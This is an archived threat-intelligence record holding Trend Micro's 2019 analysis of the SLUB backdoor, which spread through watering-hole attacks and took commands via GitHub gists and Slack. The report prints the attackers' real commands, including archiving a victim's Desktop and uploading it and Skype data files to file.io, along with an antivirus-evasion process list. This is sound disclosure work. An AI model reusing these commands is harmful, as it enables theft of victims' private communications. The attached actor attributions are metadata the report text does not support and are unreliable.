{
    "id": "0024986a-c6f9-4d24-87c2-7dc00eb6cf93",
    "created_at": "2023-01-12T15:09:22.855842Z",
    "updated_at": "2025-03-27T02:08:40.633873Z",
    "deleted_at": null,
    "sha1_hash": "333361f396ce60a346438e5d162d21f2e2105d49",
    "title": "2019-03-07 - New SLUB Backdoor Uses GitHub, Communicates via Slack",
    "authors": "",
    "file_creation_date": "2022-05-28T17:34:30Z",
    "file_modification_date": "2022-05-28T17:34:30Z",
    "file_size": 242726,
    "plain_text": "# New SLUB Backdoor Uses GitHub, Communicates via Slack\n\n**[blog.trendmicro.com/trendlabs-security-intelligence/new-slub-backdoor-uses-github-communicates-via-slack/](https://blog.trendmicro.com/trendlabs-security-intelligence/new-slub-backdoor-uses-github-communicates-via-slack/)**\n\nMarch 7, 2019\n\nWe recently came across a previously unknown malware that piqued our interest in multiple\n[ways. For starters, we discovered it being spread via watering hole attacks, a technique that](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/137/watering-hole-101)\ninvolves an attacker compromising a website before adding code to it so visitors are redirected\nto the infecting code. In this case, each visitor is redirected only once. The infection was done\n[by exploiting CVE-2018-8174, a VBScript engine vulnerability that was patched by Microsoft](https://nvd.nist.gov/vuln/detail/CVE-2018-8174)\nback in May 2018.\n\nSecond, it uses a multi-stage infection scheme. After it exploits the vulnerability, it downloads a\nDLL and runs it in PowerShell (PS). This file, which is a downloader, then downloads and runs\nthe second executable file containing a backdoor. The first stage downloader also checks for\nthe existence of different kinds of antivirus software processes, and then proceeds to exit if any\nis found. At the time of discovery, the backdoor was seemingly unknown to AV products.\n\nIn addition to the previously mentioned facts, we quickly noticed that the malware was\nconnecting to the Slack platform, a collaborative messaging system that lets users create and\nuse their own workspaces through the use of channels, similar to the IRC chatting system. We\nfound this quite interesting, since we haven’t observed any malware to date that communicates\n[using Slack-- although we've previously discussed how cybercriminals could possibly abuse](https://documents.trendmicro.com/assets/wp/wp-how-cybercriminals-can-abuse-chat-platform-apis-as-cnc-infrastructures.pdf)\nchat platforms as part of their attack.\n\n\n-----\n\nOur technical investigation and analysis of the attacker s tools, techniques, and procedures\n(TTP) lead us to think that this threat is actually a stealthy targeted attack run by capable\nactors, and not a typical cybercriminal scheme.\n\nNote that as soon as this malware was discovered, we informed the Canadian Centre for\nCyber Security, which acts as Canada’s National Computer Security Incident Response Team\n(CSIRT). The Cyber Centre alerted the site operator, helped them understand the malware that\nwas found, and offered mitigation advice.\n\n**_Infection Chain_**\n\n[Figure 1. The infection chain of the attack](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-1.jpg)\n\n_Figure 1. The infection chain of the attack_\n\n**_The downloader_**\n\nThe downloader, which runs through PowerShell as a DLL, serves several purposes. The first\nis to download the second stage malware, which we called the SLUB (for SLack and githUB;\n**detected as Backdoor.Win32.SLUB.A) backdoor and execute it. The second purpose is to**\ncheck if the following antivirus processes are running:\n\nV3Tray.exe\nAYAgent.aye\nnavapsvc.exe\nashServ.exe\navgemc.exe\nbdagent.exe\nZhuDongFangYu.exe\n\nIf the downloader finds one of these, it simply exits.\n\nFinally, the downloader also exploits the CVE-2015-1701 vulnerability to acquire Local\nPrivilege Escalation. The exploit's code was likely created by modifying code from a GitHub\nrepository, which is shown in the image below.\n\n[Figure 2. The unmodified code](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-2.jpg)\n\n_Figure 2. The unmodified code_\n\n**_The SLUB backdoor_**\n\nThe SLUB backdoor is a custom one written in the C++ programming language, statically\nlinking curl library to perform multiple HTTP requests. Other statically-linked libraries are boost\n(for extracting commands from gist snippets) and JsonCpp (for parsing slack channel\ncommunication).\n\n\n-----\n\nThe malware also embeds two authorization tokens to communicate with the Slack API.\n\nIt copies itself to ProgramData\\update\\ and creates persistence via a Run registry key,\ncalling export function UpdateMPUnits with rundll32.exe. Note the typo in the\nValueName, “Microsoft Setup Initializazion.”\n\n[Figure 3. Screenshots of the Run registry key](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-3.jpg)\n\n_Figure 3. Screenshots of the Run registry key_\n\nIt downloads a specific “gist” snippet from Github and parses it, looking for commands\n(which we will cover further in this entry) to execute. Only lines starting with “^” and\nending with “$” will be executed. The other lines are ignored.\n\n_Figure 4. The “gist” snippet that is downloaded from Github_\n\nThe result of the commands is then posted to a private Slack channel in a particular workspace\nusing the embedded tokens.\n\nNote that a side effect of this particular setup is that the attacker has no way to issue\ncommands to a specific target. Each infected computer will execute the commands that are\nenabled in the gist snippet upon checking it.\n\nFigure 5. Scheme of the backdoor communication, with the first arrow starting from the\nperson who initiates the connection\n\n_Figure 5. Scheme of the backdoor communication, with the first arrow starting from the person_\n_who initiates the connection_\n\n**_Backdoor features_**\n\nThe backdoor supports the following commands and subcommands (most of them are selfexplanatory). Commands and subcommands / parameters are separated with a comma “,”, as\nseen in figure 4.\n\n\n**Command**\n**Line**\n\n\n**Details**\n\n\n_exec_ Execute command with cmd.exe\n\n_dnexec_ Download and execute command\n\n_update_ Download a file, remove the current one and run the downloaded file\n\n_destroy_ Delete malware from disk with a batch script\n\n_capture_ Take screenshot and send it to slack channel\n\n\n-----\n\n**file**\n\n_list_ List specified file\n\n_copy_ Copy specified file\n\n_delete_ Delete specified file\n\n_upload_ Upload local file to file.io website and post the download link to the Slack\nchannel\n\n**dir**\n\n_create_ Create directory\n\n_remove_ Remove directory\n\n**proc**\n\n_list_ List processes\n\n_kill_ Terminate process\n\n**drive**\n\n_list_ Get information about each volume of the current drive, such as free space,\nextended attributes, USN journal activation, and encryption state\n\n**reg**\n\n_Query_ Query registry key\n\n_Read_ Read registry key\n\n_Write_ Write registry key\n\n_tmout_ Call to “sleep” function\n\n**_Slack communication function_**\n\nThe slack communication function contains two hardcoded authentication tokens split into a\nfew smaller chunks.\n\n[Figure 6. Code of the communication function](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-6-1.jpg)\n\n_Figure 6. Code of the communication function_\n\n\n-----\n\nLater, the backdoor gets the username and computer name (seen in Figure 7) then creates\nand uploads the Slack message into a channel. It uses the following API to post messages:\n\nhttps://api.slack.com/methods/chat.postMessage\n\n[Figure 7. Retrieving the username and computer name](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-7.jpg)\n\n_Figure 7. Retrieving the username and computer name_\n\nThe keywords “title,” “text,” “channel,” and “attachments” are clearly visible in the function\nlisting.\n\n[Figure 8. Function listing showing keywords](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-8.jpg)\n\n_Figure 8. Function listing showing keywords_\n\nThe output of every command is sent to a private Slack channel, while every command itself is\nsent to a different private Slack channel as an attachment with the text\n“*computername:username*”.\n\n**_The attacker’s tools, techniques and procedures_**\n\nThe Github account and the Slack workspace were created specifically for a campaign on\nFebruary 19 and 20, while we estimate that the attacker compiled the malware on February 22.\nThe attacker added the first commands to Github on February 20. However looking at the\nSlack channels, we can see that the attacker tested the malware on February 23 and 24. The\nfirst victims were seen on February 27. The attackers' first actions involve getting context\ninformation to learn more about the computer they infected:\n\n^exec,tasklist$ ^capture$ ^drive,list$ ^file,list,C:\\Users\\$\n^reg,read,HKEY_CURRENT_USER,SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run$\n\nThey look for running processes, take screen captures, list drives on the machine, list all users,\nand check the malware's persistence registry key. They will also usually list some known\ndirectories:\n\n^exec,dir /s C:\\Users\\USER\\Desktop\\$\\ ^exec,dir /s C:\\Users\\USER\\Downloads\\$\\\n^exec,dir /s C:\\Users\\USER\\Recent\\$\n\nSome commands caught our interest, such as one that allows the attacker to create an archive\nfile of the user's entire Desktop folder, which is then exfiltrated:\n\n^exec,powershell -Command compress-archive -path C:\\Users\\USER\\Desktop destinationpath C:\\Users\\USER\\doc1$\\ ^file,upload,C:\\Users\\USER\\doc1$\n\nThe following command allows an attacker to build a CAB file containing the file tree of the\nuser’s Desktop:\n\n\n-----\n\nexec,cd C:\\Users\\USER & dir /s /b /a-d C:\\Users\\USER\\Desktop >\nC:\\Users\\USER\\win12 & makecab /d CabinetName1=win34 /f C:\\Users\\USER\\win12$\n\nThe attacker is also seemingly interested in files containing the local archive in Skype:\n\n^file,upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline-storage-ecs.data$\n^file,upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline-storage.data$\n^file,upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline-storage.data-shm$\n^file,upload C:\\Users\\Admin\\AppData\\Roaming\\Skype\\DataRv\\offline-storage.data-wal$\n\nThe attacker copies all the HWP files (extension used by a Korean word processor) to a\nspecific directory.\n\n^exec,copy C:\\Users\\USER\\Desktop\\*.hwp C:\\Users\\USER\\oo$\n\nThe attacker likely planned to exfiltrate this directory — however, we did not see any\ncommands for this. We also noted a specific interest in a software called “Neologic Plus\nBoard,” which seems to be used for the administration of bulletin board systems. Some of the\nfiles that the attackers retrieved contained hundreds of BBS URLs.\n\nWe also noticed that most of the files uploaded to file.io were already deleted when we tried to\nretrieve them.\n\nBased on the commands run by the attackers, we theorize that they are looking for peoplerelated information. The attackers want to know more about the targeted victims’\ncommunications. Thus, they dig into activities on Twitter, Skype, KakaoTalk, BBS — and\npossibly more communication systems — in addition to collecting the HWP files.\n\nThis timeline of events shows the speed in which the threat actors launched the attack:\n\n[Figure 9. Timeline of events](https://blog.trendmicro.com/content/dam/trendmicro/global/en/migrated/security-intelligence-migration-spreadsheet/trendlabs-security-intelligence/2019/03/SLUB-Figure-9.jpg)\n\n_Figure 9. Timeline of events_\n\n**_Conclusion_**\n\nPerhaps the most unique aspect of this campaign is that it makes use of three different online\nservices to issue commands, get the results, and retrieve files from compromised hosts.\n\nOur investigation makes us believe with strong confidence that it was part of a possible\ntargeted attack campaign. So far, we have not been able to find related attacks, and have not\nspotted the custom backdoor elsewhere. We have been searching for similar samples and\nhave found none so far, which is a strong indication that the attackers either developed the\nmalware or got it from a private developer who has not publicly leaked it.\n\n\n-----\n\nThe commands that the attackers ran clearly show a strong interest in person-related\ninformation, with a special focus on communication software, in an attempt to learn more about\nthe people behind the computers they infected.\n\nThe attackers also appear to be professionals, based on their way of handling their attack.\nThey only use public third party services, and therefore did not need to register any domains or\nanything else that could leave a trail. The few email addresses we found during the\ninvestigation were also using trash email systems, giving the attackers a clean footprint.\nFinally, the watering hole chosen by the attackers can be considered interesting for those who\nfollow political activities, which might give a glimpse into the nature of the groups and\nindividuals that the attackers are targeting.\n\nWe would like to thank Github’s SIRT and Slack’s security teams for quickly removing the\nrelated files, which effectively cut the communication between the attackers and their malware.\n\nIn response to this incident, Slack replied with the following: As noted in their post, Trend Micro\n_recently discovered a third party’s unauthorized access of another third party’s computer using_\n_malware, and reported to us the existence of a Workspace on Slack related to this effort. We_\n_investigated and immediately shut down the single Workspace as a violation of our terms of_\n_service, and we confirmed that Slack was not compromised in any way as part of this incident._\n_We are committed to preventing the misuse of our platform and we will take action against_\n_[anyone who violates our terms of service.](https://slack.com/terms-of-service)_\n\n**_Indicators of Compromise (IoCs):_**\n\n3ba00114d0ae766cf77edcdcc953ec6ee7527181968c02d4ffc36b9f89c4ebc7\n(Trojan.Win32.CVE20151701.E)\n43221eb160733ea694b4fdda70e7eab4a86d59c5f9749fd2f9b71783e5da6dd7\n(Backdoor.Win32.SLUB.A)\n\n**_URLs:_**\n\nhxxps://gist.github[.]com/kancc14522/626a3a68a2cc2a91c1ece1eed7610c8a\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-03-07 - New SLUB Backdoor Uses GitHub, Communicates via Slack.pdf"
    ],
    "report_names": [
        "2019-03-07 - New SLUB Backdoor Uses GitHub, Communicates via Slack.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b69037ec-2605-4de4-bb32-a20d780a8406",
            "created_at": "2023-01-06T13:46:38.790766Z",
            "updated_at": "2025-03-27T02:00:02.919758Z",
            "deleted_at": null,
            "main_name": "MUSTANG PANDA",
            "aliases": [
                "TEMP.HEX",
                "TA416",
                "TANTALUM",
                "Twill Typhoon",
                "Earth Preta",
                "Stately Taurus",
                "LuminousMoth",
                "Polaris",
                "BRONZE PRESIDENT",
                "HoneyMyte",
                "Red Lich"
            ],
            "source_name": "MISPGALAXY:MUSTANG PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9baa7519-772a-4862-b412-6f0463691b89",
            "created_at": "2022-10-25T15:50:23.354429Z",
            "updated_at": "2025-03-27T02:00:55.45162Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Mustang Panda",
                "TA416",
                "RedDelta",
                "BRONZE PRESIDENT"
            ],
            "source_name": "MITRE:Mustang Panda",
            "tools": [
                "Cobalt Strike",
                "RCSession",
                "NBTscan",
                "PoisonIvy",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2ee03999-5432-4a65-a850-c543b4fefc3d",
            "created_at": "2022-10-25T16:07:23.882813Z",
            "updated_at": "2025-03-27T02:02:10.0116Z",
            "deleted_at": null,
            "main_name": "Mustang Panda",
            "aliases": [
                "Bronze President",
                "Camaro Dragon",
                "Earth Preta",
                "HoneyMyte",
                "Mustang Panda",
                "Operation SMUGX",
                "Operation SmugX",
                "PKPLUG",
                "Red Lich",
                "Stately Taurus",
                "TEMP.Hex"
            ],
            "source_name": "ETDA:Mustang Panda",
            "tools": [
                "9002 RAT",
                "AdFind",
                "Agent.dhwf",
                "Agentemis",
                "CHINACHOPPER",
                "China Chopper",
                "Chymine",
                "ClaimLoader",
                "Cobalt Strike",
                "CobaltStrike",
                "DCSync",
                "DOPLUGS",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Farseer",
                "Gen:Trojan.Heur.PT",
                "HOMEUNIX",
                "Hdump",
                "HenBox",
                "HidraQ",
                "Hodur",
                "Homux",
                "HopperTick",
                "Hydraq",
                "Impacket",
                "Kaba",
                "Korplug",
                "LadonGo",
                "MQsTTang",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "NBTscan",
                "NetSess",
                "Netview",
                "Orat",
                "POISONPLUG.SHADOW",
                "PUBLOAD",
                "PVE Find AD Users",
                "PlugX",
                "Poison Ivy",
                "PowerView",
                "QMAGENT",
                "RCSession",
                "RedDelta",
                "Roarur",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Sogu",
                "TIGERPLUG",
                "TONEINS",
                "TONESHELL",
                "TVT",
                "TeamViewer",
                "Thoper",
                "TinyNote",
                "WispRider",
                "WmiExec",
                "XShellGhost",
                "Xamtrav",
                "Zupdax",
                "cobeacon",
                "nbtscan",
                "nmap",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536162,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653759270,
    "ts_modification_date": 1653759270,
    "files": {
        "pdf": "https://archive.orkl.eu/333361f396ce60a346438e5d162d21f2e2105d49.pdf",
        "text": "https://archive.orkl.eu/333361f396ce60a346438e5d162d21f2e2105d49.txt",
        "img": "https://archive.orkl.eu/333361f396ce60a346438e5d162d21f2e2105d49.jpg"
    }
}